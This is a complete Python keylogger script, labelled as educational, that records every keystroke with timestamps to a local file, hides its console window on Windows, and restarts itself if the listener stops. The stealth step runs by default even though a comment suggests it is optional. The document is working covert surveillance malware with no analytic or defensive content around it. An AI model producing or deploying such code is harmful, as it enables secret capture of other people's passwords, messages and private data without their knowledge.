#!/usr/bin/env python3
# A keyboard logger for educational purposes

import os
from pynput import keyboard
from datetime import datetime
import threading
import time

# Path to save logs
log_file = "logs.txt"

def append_to_log(key_str):
    """Append the key information to the log file with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"{timestamp}: {key_str}\n")

def on_press(key):
    """Callback function when a key is pressed"""
    try:
        # For regular characters
        key_str = key.char
    except AttributeError:
        # For special keys like Shift, Ctrl, etc.
        key_str = str(key).replace("Key.", "<")
        key_str = f"{key_str}>"
    
    append_to_log(key_str)

def hide_console():
    """Makes the console window invisible on Windows"""
    try:
        import ctypes
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE
    except Exception:
        pass  # If it fails, continue anyway

def start_logger():
    """Start the keylogger"""
    # Create the log file if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("=== Keylogger Started ===\n")
    
    # Start the keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Log when the keylogger starts
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"\n=== Session Started at {timestamp} ===\n")
    
    return listener

if __name__ == "__main__":
    # Uncomment the next line to hide the console window when running
    hide_console()
    
    # Start the keylogger
    listener = start_logger()
    
    try:
        # Keep the script running
        while True:
            time.sleep(600)  # Check every 10 minutes if the listener is still active
            if not listener.is_alive():
                listener = start_logger()  # Restart if it crashed
    except KeyboardInterrupt:
        # If the user presses Ctrl+C
        pass
